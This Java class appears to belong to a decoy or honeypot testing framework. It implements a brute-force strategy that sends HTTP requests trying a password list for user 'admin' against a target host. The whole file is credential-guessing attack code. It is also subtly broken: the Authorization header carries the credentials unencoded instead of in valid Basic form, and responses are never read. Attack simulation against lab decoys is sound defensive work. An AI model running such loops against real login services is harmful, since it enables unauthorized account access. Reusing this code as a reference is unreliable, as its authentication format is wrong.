package com.mirage.specter;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.List;

/** Tries a password list against a decoy login. For use ONLY on lab decoys. */
public final class BruteForceAttack implements AttackStrategy {

    private final List<String> passwords;

    public BruteForceAttack(List<String> passwords) {
        this.passwords = passwords;
    }

    @Override
    public void run(Target target) {
        for (String password : passwords) {
            try (Socket socket = new Socket(target.host(), target.port())) {
                OutputStream out = socket.getOutputStream();
                String req = "GET / HTTP/1.0\r\n"
                           + "Authorization: Basic admin:" + password + "\r\n\r\n";
                out.write(req.getBytes(StandardCharsets.UTF_8));
                out.flush();
            } catch (IOException ignored) {
                // the decoy may close the socket; move on to the next password
            }
        }
    }

    @Override
    public String name() {
        return "brute-force";
    }
}
